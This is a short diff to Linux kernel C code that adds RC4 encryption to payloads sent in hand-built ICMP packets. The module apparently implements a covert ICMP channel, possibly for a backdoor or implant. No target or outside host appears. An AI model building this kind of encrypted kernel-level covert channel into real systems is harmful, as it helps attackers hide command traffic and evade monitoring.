@@ -16,9 +16,10 @@
 #include <linux/ip.h> 
 #include <linux/udp.h>
 #include <linux/icmp.h>
+
 #include "response.h"
 #include "context.h"
-
+#include "crypto.h"
 unsigned short cksum(void *b, int len) {
     unsigned short *buf = b;
     unsigned int sum = 0;
@@ -87,7 +88,8 @@ int send_icmp(void *payload, ssize_t payload_len, struct Context *c)
 
     // Prepare ICMP payload
     data = skb_put(skb, payload_len);
-    memcpy(data, payload, payload_len); // Example payload
+    memcpy(data, payload, payload_len);
+    rc4_crypt(&c->config, data, payload_len);
 
     // ICMP Header
     icmph = (struct icmphdr *)skb_push(skb, sizeof(struct icmphdr));
